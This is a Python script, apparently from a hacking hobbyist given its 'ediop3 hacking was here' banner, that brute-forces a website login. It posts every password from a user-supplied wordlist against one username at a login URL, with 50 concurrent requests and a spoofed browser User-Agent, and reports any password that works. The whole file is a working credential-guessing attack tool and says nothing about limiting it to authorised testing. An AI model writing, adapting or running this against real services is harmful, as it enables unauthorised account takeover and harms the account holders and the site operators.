import asyncio
import aiohttp
import aiofiles
from aiohttp import ClientSession

def print_logo():
    logo = r"""
    ███████╗██████╗░██╗░█████╗░██████╗░██████╗░░██████╗░██████╗░██╗░░░██╗░█████╗░██████╗░
    ██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗██╔════╝██╔═══██╗██║░░░██║██╔══██╗██╔══██╗
    █████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝╚█████╗░██║██╗██║██║░░░██║███████║██║░░██║
    ██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗░╚═══██╗╚██████╔╝██║░░░██║██╔══██║██║░░██║
    ███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝██████╔╝░╚═██╔═╝░╚██████╔╝██║░░██║██████╔╝
    ╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░
                             __ediop3 hacking was here__
    """
    print(logo)

async def check_login_response(response):
    """
    Placeholder function to demonstrate response validation logic.
    Replace with actual logic based on the service's response.
    """
    if response.status == 200:
        content = await response.text()
        if "incorrect" not in content.lower():
            return True
    return False

async def attempt_login(session: ClientSession, username: str, password: str, headers: dict):
    try:
        async with session.post('https://www.example.com/accounts/login/',
                                data={'username': username, 'password': password},
                                headers=headers) as response:
            if await check_login_response(response):
                print(f"Valid password found: {password}")
                return True
            else:
                print(f"Attempt with password '{password}' failed.")
                return False

    except aiohttp.ClientError as e:
        print(f"An error occurred: {e}")
        return False

async def process_wordlist(session: ClientSession, username: str, wordlist_path: str, headers: dict, sem: asyncio.Semaphore):
    async with aiofiles.open(wordlist_path, 'r') as file:
        async for password in file:
            password = password.strip()
            async with sem:  # Semaphore limits the number of concurrent tasks
                if await attempt_login(session, username, password, headers):
                    return True
    return False

async def brute_force(username: str, wordlist_path: str):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    # Limit concurrency to avoid overwhelming the server
    sem = asyncio.Semaphore(50)

    async with aiohttp.ClientSession() as session:
        if await process_wordlist(session, username, wordlist_path, headers, sem):
            print("Brute force process completed successfully.")
        else:
            print("No valid password found.")

if __name__ == '__main__':
    print_logo()
    username = input("Enter the username of the account to test login: ")
    wordlist_path = input("Enter the path to the wordlist file: ")

    asyncio.run(brute_force(username, wordlist_path))
